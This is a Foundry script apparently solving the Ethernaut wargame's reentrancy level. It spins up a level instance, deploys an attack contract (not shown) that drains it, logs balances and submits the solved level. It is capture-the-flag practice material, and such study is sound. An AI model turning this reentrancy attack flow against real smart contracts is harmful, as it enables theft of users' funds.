// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "interfaces/IEthernaut.sol";
import { Reentrance } from "src/Level10.sol";
import { L10Attack } from "src/Level10Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance{ value: 0.001 ether }(0x2a24869323C0B13Dff24E196Ba072dC790D52479);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        Reentrance instance = Reentrance(payable(instanceAddress));

        (,, address txOrigin) = vm.readCallers();
        console2.log(txOrigin.balance);
        L10Attack attack = new L10Attack(instance);
        attack.attack{ value: 0.0001 ether, gas: 1_000_000 }();
        console2.log(txOrigin.balance);

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
